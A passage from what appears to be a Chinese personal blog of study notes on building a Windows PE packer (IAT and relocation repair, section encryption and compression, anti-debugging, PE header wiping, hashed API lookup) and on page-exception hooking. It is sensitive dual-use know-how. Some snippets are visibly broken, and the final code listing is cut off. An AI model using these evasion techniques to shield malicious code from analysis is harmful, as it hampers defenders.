xop.</p></blockquote><p>原来这东西是提供给虚拟机使用的</p><p>反汇编stub文件-&gt;每条汇编挂钩handler-&gt;当eip执行地址则进入虚拟机处理</p><p>然后compresstiondata会调用跟这个vm进行vmentry</p><p>这个就用来compressiondata前进行vm的解密</p><h3 id="之后我们分析这些源码有哪些是相通的函数-然后来看一下函数有没有细致差别"><a href="#之后我们分析这些源码有哪些是相通的函数-然后来看一下函数有没有细致差别" class="headerlink" title="之后我们分析这些源码有哪些是相通的函数 然后来看一下函数有没有细致差别"></a>之后我们分析这些源码有哪些是相通的函数 然后来看一下函数有没有细致差别</h3><p>Peprotect和guishou_pack-master的sutb.dll代码差不多</p><p>那我们进行pack-master和guishou_pack-master的stub.dll的相似函数的内容分析</p><table><thead><tr><th></th><th>pack-master</th><th>guishou_pack-master</th></tr></thead><tbody><tr><td>#头</td><td>#include “aplib.h”压缩引擎</td><td></td></tr><tr><td></td><td>info.h</td><td></td></tr><tr><td></td><td></td><td>AES.h</td></tr><tr><td></td><td>define IMAGE_SIZEOF_BASE_RELOCATION 定义基址重定位表</td><td></td></tr><tr><td></td><td>define LOG_PATH L”D:&#x2F;log.txt” 打印日志设置</td><td></td></tr><tr><td></td><td>define ANTI_REVERSE 反调试设置</td><td></td></tr><tr><td></td><td>define SUPPORT_LOG 打开默认日志</td><td></td></tr><tr><td>中</td><td>定义一堆内存数据流结构体和自定义的内容管理函数</td><td></td></tr><tr><td>开始</td><td>getNtHeader和getImageSectionHeader</td><td>获取各种头</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td>又写了两个内容管理函数</td><td></td></tr><tr><td></td><td>isdebug反调试</td><td></td></tr><tr><td></td><td>又定义一些七了八了的内容管理函数</td><td></td></tr><tr><td></td><td>根据pUnhandledExceptionFilter和pUnhandledExceptionFilter1使用汇编编写debug1</td><td></td></tr><tr><td></td><td>TlsCallBack</td><td></td></tr><tr><td>汇编获取kernel</td><td></td><td>better  (kernel+GetGPAFunAddr)的汇编版hKernel32;</td></tr><tr><td>GetGPAFunAddr</td><td>DOS头\Nt头-&gt;导出表项-&gt;导出表详细信息-&gt;根据函数名查找详细地址值</td><td></td></tr><tr><td></td><td>利用GetGPAFunAddr获取API地址</td><td>利用hKernel32获取地址</td></tr><tr><td></td><td>编写getExePath获取进程地址</td><td></td></tr><tr><td></td><td>利用getExePath实现那些文件的自删除  不知道有个鬼用</td><td></td></tr><tr><td>总结</td><td>除了多了解压缩函数和内存管理啥也没有</td><td>使用汇编定位api使代码更好写<br />而且还做了加密 加壳 花指令等函数</td></tr></tbody></table><p>上面这个的话我感觉还是用汇编获取api更好用一点</p><p>stub.dll里面的函数InitTls和callTLS的区别</p><table><thead><tr><th></th><th>InitTls(pack-master)</th><th>callTLS(guishou_pack-master)</th></tr></thead><tbody><tr><td></td><td>获取pTlsCallBack和pStubCallBack的虚拟地址</td><td>(DWORD)pfnGetMoudleHandleA(NULL);获取程序的句柄加载基址</td></tr><tr><td></td><td>直接用虚拟地址获取TLScalbacke</td><td>GetOptionHeader((char*)dwBase)-&gt;DataDirectory[9].VirtualAddress;获取内存地址</td></tr><tr><td></td><td></td><td>pTlsTab &#x3D; (PIMAGE_TLS_DIRECTORY)(dwTlsRva + dwBase);TLs表的句柄加载基址和内存地址</td></tr><tr><td></td><td></td><td>nTlsCallBacks &#x3D; <em>(DWORD</em>)pTlsTab-&gt;AddressOfCallBacks;如果获取TLS表成功 引用AddressOfCallBacks;</td></tr><tr><td></td><td></td><td>使用汇编call nTlsCallBacks</td></tr></tbody></table><p>修复IAT(都是用的动态修复 因为计算机每次重启.系统dll映射到exe程序所在的地址都会变,IAT必须动态修复).修复IAT表需要用到”LoadLibraryA”和GetProcAddress两个函数，这两个函数存在于KERNEL32这个DLL中，可以通过FS寄存器找到进程环境块PEB，得到kernel32的地址，找到GetProcAddress函数所在地址，再通过GetProcAddress找到LoadLibraryA的地址。</p><table><thead><tr><th>recoverIAT</th><th>FixImportTable_Normal</th></tr></thead><tbody><tr><td>&#x2F;&#x2F;获取当前程序的加载基址&lt;br&#x2F;HMODULE hModule &#x3D; s_apier.GetModuleHandleW(NULL);<br />然后做出了判断是否获取成功</td><td>&#x2F;&#x2F;设置文件属性为可写<br/>SetFileHeaderProtect(true);</td></tr><tr><td>获取NT头进而获取加载基址</td><td>&#x2F;&#x2F;获取当前程序的加载基址<br/>DWORD ImageBase &#x3D; (DWORD)pfnGetMoudleHandleA(NULL);</td></tr><tr><td>&#x2F;&#x2F;导入表<br/>lpImportTable &#x3D; (IMAGE_IMPORT_DESCRIPTOR*)((DWORD)lpImageBase + g_globalVar.dwIATVirtualAddress);<br />这里的dwIATVirtualAddress 是自己定义的结构体</td><td>&#x2F;&#x2F;导入表&#x3D;导入表偏移+加载基址<br/>IMAGE_IMPORT_DESCRIPTOR* pImp &#x3D; (IMAGE_IMPORT_DESCRIPTOR*)(GetOptionHeader((char*)ImageBase)-&gt;DataDirectory[1].VirtualAddress + ImageBase);</td></tr><tr><td>获取IAT,这是需要将函数地址写入的地方,但是相比右边缺少了校验,默认为获取PINT</td><td>根据导入表获取Int 如果没有INT就获取IAT</td></tr><tr><td>后面跟右边差不多 我感觉右边的代码更好写且好用一点</td><td>&#x2F;&#x2F; 加载dllhImpModule &#x3D; (HMODULE)pLoadLibraryA((char*)(pImp-&gt;Name + ImageBase));</td></tr><tr><td></td><td>while导入函数地址u1.Function if  (IMAGE_SNAP_BY_ORDINAL)判断导入的方式、序号还是名称IMAGE_SNAP_BY_ORDINAL(pInt-&gt;u1.Ordinal  来获取impaddress</td></tr><tr><td></td><td>pVirtualProtect保护piat的导入函数地址u1.Function</td></tr><tr><td></td><td>将刚才获取到的pint的impaddress赋值给pIat-&gt;u1.Function</td></tr><tr><td></td><td></td></tr></tbody></table><p>修复原始重定位表 (只有pepacker里面有)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fixRelocation</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwImageBase;<br>PIMAGE_BASE_RELOCATIONpReloc;<br><br><span class="hljs-keyword">if</span> (g_globalVar.dwRelocationRva == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>dwImageBase = (DWORD)s_apier.<span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (dwImageBase == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">LOGGER_MESSAGE</span>(<span class="hljs-string">&quot;GetModuleHandleW failed&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br>pReloc = (PIMAGE_BASE_RELOCATION)((DWORD)dwImageBase + g_globalVar.dwRelocationRva);<br><span class="hljs-keyword">while</span> (pReloc-&gt;VirtualAddress)<br>&#123;<br>PTYPEOFFSET pTypeOffset = (PTYPEOFFSET)(pReloc + <span class="hljs-number">1</span>);<br>DWORD dwNumber = (pReloc-&gt;SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / <span class="hljs-number">2</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; dwNumber; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (*(PWORD)(&amp;pTypeOffset[i]) == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>DWORD dwRVA = pTypeOffset[i].offset + pReloc-&gt;VirtualAddress;<br>DWORD dwAddressOfReloc = *(PDWORD)(dwImageBase + dwRVA);<br><br><span class="hljs-comment">//设置修复后的重定向数据</span><br>*(PDWORD)((DWORD)dwImageBase + dwRVA) = dwAddressOfReloc - g_globalVar.dwOrignalImageBase + dwImageBase;<br>&#125;<br>pReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pReloc + pReloc-&gt;SizeOfBlock);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>pepacker也多了decompress解压缩函数</p><p>修复重定向估计也是为了配合解压使用的</p><p>那我们直接改guisuo_packer的代码            compress代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">压缩函数<br></code></pre></td></tr></table></figure><h2 id="开始写"><a href="#开始写" class="headerlink" title="开始写"></a>开始写</h2><h3 id="写个压缩区段-先分析一下流程"><a href="#写个压缩区段-先分析一下流程" class="headerlink" title="写个压缩区段 先分析一下流程"></a>写个压缩区段 先分析一下流程</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">压缩区段<br>1.获取文件头的大小，并获取除资源段<span class="hljs-string">.rsrc</span>和线程本地存储<span class="hljs-string">.tls</span>之外的区段的文件总大小<br>2.读取要压缩的段到内存<br>3.压缩 调用compress函数<br>compress函数<br>调用apsafe_pack压缩函数<br>4.保存<span class="hljs-string">.rsrc</span> <span class="hljs-string">.tls</span>段到内存空间<br>5.设置压缩信息到信息结构体<br>6. 申请新空间，使m_pNewBuf指向它，将m_pBuf文件头拷贝<br>7. 添加<span class="hljs-string">.compres</span>段<br><br></code></pre></td></tr></table></figure><p>再看一下encrypt加密区段函数</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">获取区段数量<br>获取第一个区段<br>pStub.pStubConf用于保存数据<br><span class="hljs-keyword">if</span>判断资源段和tls段不加密并跳过无效的区段<br><span class="hljs-keyword">else</span><br>开始加密所有区段<br>获取区段的首地址和大小<br>修改属性为可写<br>加密目标区段<br>修改回原来的属性<br>保存数据到共享信息结构体<br></code></pre></td></tr></table></figure><p>为了更好的编写和使用 得写一个函数用于获取rsrc和tls段的信息</p><p>好麻烦啊 直接在peprotect写加密吧</p><h3 id="stub-1"><a href="#stub-1" class="headerlink" title="stub"></a>stub</h3><ul><li><p><input checked="" disabled="" type="checkbox"> 解密代码段</p></li><li><p><input checked="" disabled="" type="checkbox"> 加密iat</p></li><li><p><input checked="" disabled="" type="checkbox"> 反调试 x3个 (后面可以嵌套ollvm)</p></li><li><p><input checked="" disabled="" type="checkbox"> 解压和压缩区段</p></li><li><p><input checked="" disabled="" type="checkbox"> 密码弹框</p></li><li><p><input checked="" disabled="" type="checkbox"> 调用Tls回调函数  (用于反调试)</p></li><li><p><input checked="" disabled="" type="checkbox"> 修复exe重定位</p></li><li><p><input checked="" disabled="" type="checkbox"> 恢复数据目录表</p></li><li><p><input checked="" disabled="" type="checkbox"> 混淆函数</p></li><li><p><input checked="" disabled="" type="checkbox"> 修复iat</p></li><li><p><input disabled="" type="checkbox"> 加花函数</p></li></ul><p>先看一下什么时候需要修复iat</p><p>修复iat 换句话来说就是修复导入表 importtable   但是都常见于脱壳 </p><p>因为原来的程序在获取完IAT后就把字符删掉了，文件偏移里的字符串指针没有了，就没法自动获取地址了。所以必须脱壳之后必须把IAT修复好 </p><p>那么解密代码段话就是类似一个脱壳的过程 可以会导致rva的偏移,这就需要我门修复iat去重新获取。</p><p>那么我们也要对应的去改一下pack.cpp</p><p>接下来看下要不要对那个虚拟壳进行改写学习</p><p><em>抹去PE指纹</em>(不过这类常规方法只能抹去内存中的pe头)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">clearpeheader</span><span class="hljs-params">()</span>&#123; <br>hshellModule = GetModuleHandle(<span class="hljs-string">&quot;hshell.dll&quot;</span>);<br>VirtualProtect((LPVOID)hshellModule, <span class="hljs-number">1024</span>, PAGE_READWRITE, &amp;dwOldProtect);<br><span class="hljs-comment">//抹去PE头</span><br><span class="hljs-type">PIMAGE_DOS_HEADER</span> <span class="hljs-variable">pDosHeader</span> <span class="hljs-operator">=</span> (PIMAGE_DOS_HEADER)hshellModule;<br>pDosHeader-&gt;e_magic = <span class="hljs-number">0</span>;<br><span class="hljs-type">PIMAGE_NT_HEADERS</span> <span class="hljs-variable">pNtheader</span> <span class="hljs-operator">=</span> (PIMAGE_NT_HEADERS)hshellModule;<br><span class="hljs-comment">//抹去MZ头</span><br>pNtheader-&gt;Signature = <span class="hljs-number">0</span>;<br>VirtualProtect((LPVOID)hshellModule,<span class="hljs-number">1024</span>,, &amp;dwOldProtect)<br><br>&#125;<br></code></pre></td></tr></table></figure><p>有没有写入文件的方法</p><p>都不能运行:angry: 改addshelltool</p><h3 id="接下来改高级的"><a href="#接下来改高级的" class="headerlink" title="接下来改高级的"></a>接下来改高级的</h3><ol><li>兼容x64</li></ol><h4 id="error1"><a href="#error1" class="headerlink" title="error1"></a>error1</h4><p>__declspec(naked) naked 无法识别的扩展特性</p><p>__declspec(naked) 用来将汇编语言嵌入到c语言中,手工处理堆栈,即使是裸函数 我们也能运行<img src="https://cd-1307445315.cos.ap-nanjing.pqcloud.com/CD%5C202211231951871.png" alt="image-20221123195145733"></p><p>原来是这样</p><p>原因是x64不支持使用内联汇编代码 </p><p>1.一个方法是直接把汇编代码转换成.asm文件然后再去引入</p><p>2.参考vmpshell的代码</p><p>做了判断函数 </p><p>#ifdef _WIN64 </p><p>直接 __stdcall之前的kernel 和分配好的函数</p><p>else &#x2F;&#x2F;win32</p><p>重新定义获取puGetModule和MyGetProcAddress函数</p><p>&#x2F;&#x2F;都是用来给下面sheller_code调用</p><p>我们就用第二套办法先试试</p><p>我们的目的都是为了获取windowsapi函数 但是在win64的话不需要先获取基址</p><p>而是可以直接 void _stdcall调用,所以我们只要知道我们需要哪些函数然后去定义就行<img src="https://cd-1307445315.cos.ap-nanjing.pqcloud.com/CD%5C202211232045931.png" alt="image-20221123204518797"></p><p>由于这个pGetProcAddress 我们自己定义的 x64下也没问题 所以我们直接用x64获取kernelbase就可</p><p>写到一半 发现好麻烦  除非之前已经定义过api了</p><p>我们用第一种方法</p><p>参考这个</p><p><a href="https://blog.csdn.net/Giser_D/article/details/90670974">https://blog.csdn.net/Giser_D/article/details/90670974</a></p><p>在asm定义好了函数 所以在只要写好了头文件和cpp 就不再需要声明</p><p>怪不得 vmshell的x64代码频繁用到 __stdcall</p><p>都是从asm里面调用的(但是是在cpp里面调用)</p><p>所以根本就没有第二种方法</p><p>所以我们需要改的就需要这三个东西</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.asm</span><span class="hljs-selector-class">.h</span><br><span class="hljs-number">2</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.asm</span><br><span class="hljs-number">3</span>.cpp<br></code></pre></td></tr></table></figure><p>也就是说这个_stdcall写在cpp里面就可</p><p>只要stud.h引用了STUD_H 之后cpp调用stud.h就可<img src="https://cd-1307445315.cos.ap-nanjing.pqcloud.com/CD%5C202211241315060.png" alt="image-20221124131530810"></p><p>与kernelbase的也只有这一段 后面的都可以用pGetProcAddress和pLoadLibraryExA获取</p><p>这一段的是getkernelbase-&gt; pgetprocaddress -&gt; 获取各类函数</p><p>而这些函数我们都可以用汇编直接获取</p><ul><li><input disabled="" type="checkbox"> pLoadLibraryExA  typedef定义 调用getprocaddress获取 汇编没有</li><li><input checked="" disabled="" type="checkbox"> pGetProcAddress  汇编有      但是我们代码也自己定义了</li><li><input disabled="" type="checkbox"> pExitProcess     typedef定义 调用getprocaddress获取 汇编没有</li><li><input disabled="" type="checkbox"> pVirtualProtect  typedef定义 调用getprocaddress获取 汇编没有</li><li><input disabled="" type="checkbox"> pGetLastError    typedef定义 调用getprocaddress获取 汇编没有</li><li><input disabled="" type="checkbox"> pVirtualAlloc    typedef定义 调用getprocaddress获取 汇编没有</li><li><input disabled="" type="checkbox"> pVirtualFree     typedef定义 调用getprocaddress获取 汇编没有</li><li><input disabled="" type="checkbox"> pVirtualQuery    typedef定义 调用getprocaddress获取 汇编没有</li></ul><p>汇编有的</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">puGetModule</span><br>MyGetProcAddress<br>CodeExecEntry<br>剩下的都是vm里的 没啥用<br><br></code></pre></td></tr></table></figure><p>只能直接获取LoadLibrary函数 看下怎么用的</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">pLoadLibraryExA</span> = (FnLoadLibraryExA)MyGetProcAddress(g_stud.s_Krenel32, <span class="hljs-number">0</span>xC0D83287)<span class="hljs-comment">;</span><br><span class="hljs-attr">pExitProcess</span> = (FnExitProcess)MyGetProcAddress(g_stud.s_Krenel32, <span class="hljs-number">0</span>x4FD18963)<span class="hljs-comment">;</span><br><span class="hljs-attr">pVirtualProtect</span> = (FnVirtualProtect)MyGetProcAddress(g_stud.s_Krenel32, <span class="hljs-number">0</span>xEF64A41E)<span class="hljs-comment">;</span><br><span class="hljs-attr">pGetLastError</span> = (FnGetLastError)MyGetProcAddress(g_stud.s_Krenel32, <span class="hljs-number">0</span>x12F461BB)<span class="hljs-comment">;</span><br><span class="hljs-attr">pVirtualAlloc</span> = (FnVirtualAlloc)MyGetProcAddress(g_stud.s_Krenel32, <span class="hljs-number">0</span>x1EDE5967)<span class="hljs-comment">;</span><br><span class="hljs-attr">pVirtualFree</span> = (FnVirtualFree)MyGetProcAddress(g_stud.s_Krenel32, <span class="hljs-number">0</span>x6144AA05)<span class="hljs-comment">;</span><br><br><br></code></pre></td></tr></table></figure><p>找了半天找不到直接asm获取kernelbase的办法 可能需要重构直接获取api了</p><p>判断PE 64 DLL NET</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-type">bool</span> isPE  = in_pe_dos_header-&gt;e_magic == IMAGE_DOS_SIGNATURE;<br><span class="hljs-type">bool</span> is64  = in_pe_nt_header-&gt;FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 &amp;&amp;<br>             in_pe_nt_header-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;<br><span class="hljs-type">bool</span> isDLL = in_pe_nt_header-&gt;FileHeader.Characteristics &amp; IMAGE_FILE_DLL;<br><span class="hljs-type">bool</span> isNET = in_pe_nt_header-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size != <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>windows c++ x32 pe结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存访问异常hook</title>
    <link href="/%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%E5%BC%82%E5%B8%B8hook.html"/>
    <url>/%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%E5%BC%82%E5%B8%B8hook.html</url>
    
    <content type="html"><![CDATA[<p>参考文献：</p><p>《游戏外挂攻防艺术7.2.2》</p><p>[原创]基于页面异常的Hook：原理与实现 <a href="https://bbs.pediy.com/thread-273172.htm">https://bbs.pediy.com/thread-273172.htm</a></p><p>比较好用的异常hook就是页面异常hook    这种方法可以用来反dump</p><p>Page Hook</p><p>原理</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">1.修改指令处所属页面的属性未RW <span class="hljs-built_in"> not </span> X<br>2.是的此页面被执行时发生异常,接管此异常即可<br></code></pre></td></tr></table></figure><p>13年的外挂攻防艺术用的是VEH和SEH的硬件断点来进行接管异常 </p><p>这里看一下他的源码 <a href="https://github.com/yuyuaqwq/YPage-Hook">https://github.com/yuyuaqwq/YPage-Hook</a></p><p>还是注册的VEH进行hook  &#x3D; &#x3D;</p><p>原理一样 多了单页面多个异常点hook的技术</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;YPageHook.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span>using namespace std; </span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> code_seg(<span class="hljs-string">&quot;.func&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> </span>&#123;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;test1&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> code_seg(<span class="hljs-string">&quot;&quot;</span>)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HookCallBack</span><span class="hljs-params">(LPCONTEXT context)</span> </span>&#123;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;mypackhook&quot;</span>;<br><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc <span class="hljs-type">char</span>* argv[])</span> </span>&#123;<br>PageHook hook;<br><br>hook.<span class="hljs-built_in">install</span>(<span class="hljs-type">char</span>)(func, HookCallBack);<br><span class="hljs-built_in">func</span>();<br>std::cout &lt;&lt; <span class="hljs-string">&quot;验证&quot;</span>;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">PageRecord</span> &#123;<br>LPVOID pageBase;<br><span class="hljs-type">size_t</span> count;<br>DWORD protect;<br>&#125;;<br><span class="hljs-type">static</span> std::map&lt;LPVOID, PageRecord&gt; gs_pageHook_base;<br><span class="hljs-type">static</span> std::map&lt;LPVOID, PageHook&amp;&gt; gs_pageHook_addr;<br><span class="hljs-type">static</span> std::map&lt;DWORD, PageRecord&amp;&gt; gs_pageHook_step;<br><br><br><br><span class="hljs-comment">//页对齐</span><br><span class="hljs-function"><span class="hljs-type">static</span> LPVOID <span class="hljs-title">PageAlignment</span><span class="hljs-params">(LPVOID addr)</span> </span>&#123;<br><span class="hljs-keyword">return</span> (LPVOID)((UINT_PTR)addr &amp; (UINT_PTR)(~<span class="hljs-number">0xfff</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> LONG NTAPI <span class="hljs-title">ExceptionHandler</span><span class="hljs-params">(EXCEPTION_POINTERS* ExceptionInfo)</span> </span>&#123;<br><br><span class="hljs-comment">// 判断异常类型并且接管异常</span><br><span class="hljs-keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION) &#123;<br><br>LPVOID pageBase = <span 